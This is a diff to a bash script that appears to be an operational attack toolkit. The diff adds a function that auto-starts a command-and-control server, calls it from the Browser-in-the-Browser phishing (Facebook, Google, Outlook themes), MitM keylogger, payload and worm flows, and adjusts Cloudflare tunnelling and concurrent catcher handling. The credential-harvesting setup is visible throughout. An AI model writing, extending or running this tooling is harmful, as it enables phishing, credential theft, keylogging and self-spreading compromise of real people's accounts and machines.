@@ -97,6 +97,28 @@ log() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOG"; }
 # INIT — write every embedded file to $OP/ on first run
 # This makes /tmp/start fully self-contained — no other files
 # ══════════════════════════════════════════════════════════════
+# ── Auto-start C2 if not already running ─────────────────────
+ensure_c2() {
+    if ss -tlnp 2>/dev/null | grep -q ":${C2_PORT:-8888} "; then
+        ok "C2 already running on :${C2_PORT:-8888}"
+        return
+    fi
+    info "Starting C2 server on :${C2_PORT:-8888}..."
+    LOG_DIR="$OP/logs" PAYLOAD_DIR="$OP/payloads" \
+        nohup python3 "$C2_DIR/c2_server.py" > "$OP/logs/c2_auto.log" 2>&1 &
+    C2_PID=$!
+    sleep 3
+    if ss -tlnp 2>/dev/null | grep -q ":${C2_PORT:-8888} "; then
+        ok "C2 started — panel: ${W}http://localhost:${C2_PORT:-8888}/panel${N}"
+        # Open panel in browser if display available
+        if [ -n "$DISPLAY" ] || [ -n "$WAYLAND_DISPLAY" ]; then
+            xdg-open "http://localhost:${C2_PORT:-8888}/panel" 2>/dev/null &
+        fi
+    else
+        warn "C2 failed to start — check $OP/logs/c2_auto.log"
+    fi
+}
+
 init_files() {
     mkdir -p "$OP"/{c2,victim,payloads,logs,mitm}
     mkdir -p "$OP/bitb/themes"/{facebook,google,outlook,blank}
@@ -1376,7 +1398,8 @@ open_tunnel() {
     pkill -f "cloudflared tunnel\|cloudflared.*http" 2>/dev/null
     sleep 1
 
-    TUNNEL_LOG="/tmp/tunnel_$PORT.log"
+    TUNNEL_LOG="/tmp/tunnel_${PORT}_${UID}.log"
+    rm -f "$TUNNEL_LOG" 2>/dev/null; touch "$TUNNEL_LOG" 2>/dev/null || TUNNEL_LOG=$(mktemp)
 
     # ── Named tunnel (custom domain configured) ──────────────────
     if [ -n "$CF_TUNNEL_NAME" ] && [ -n "$CF_DOMAIN" ] && [ -f "$HOME/.cloudflared/cert.pem" ]; then
@@ -1529,6 +1552,7 @@ CFEOF
 # ══════════════════════════════════════════════════════════════
 
 remote_bitb() {
+    ensure_c2
     banner
     step 4 "LAUNCH — Browser-in-the-Browser"
     echo ""
@@ -1558,6 +1582,7 @@ remote_bitb() {
 }
 
 remote_mitm_keylogger() {
+    ensure_c2
     banner
     step 4 "LAUNCH — MitM + Keylogger"
     echo ""
@@ -1650,10 +1675,13 @@ remote_drupal_brute() {
 }
 
 remote_all() {
+    # Run MitM keylogger in background (uses port 8083 + catcher on 9999)
     remote_mitm_keylogger &
-    sleep 3
-    pkill -f "catcher.py" 2>/dev/null
+    MITM_PID=$!
+    sleep 5
+    # BitB runs on port 8082 — different port, don't kill the MitM catcher
     remote_bitb
+    wait $MITM_PID 2>/dev/null
 }
 
 # ══════════════════════════════════════════════════════════════
@@ -2147,6 +2175,7 @@ PROXYEOF
 
 # ── Main payload flow ─────────────────────────────────────────
 payload_flow() {
+    ensure_c2
     PAYLOAD_DIR="/tmp/rcontrol/payloads"
     C2_LOG_DIR="/tmp/rcontrol/logs"
     CREDS_FILE="$C2_LOG_DIR/credentials.txt"
@@ -2866,6 +2895,7 @@ RDME
 
 # ── Main worm flow ────────────────────────────────────────────
 worm_flow() {
+    ensure_c2
     PAYLOAD_DIR="$HOME/.wizza/payloads"
     C2_LOG_DIR="$HOME/.wizza/logs"
     CREDS_FILE="$C2_LOG_DIR/credentials.txt"
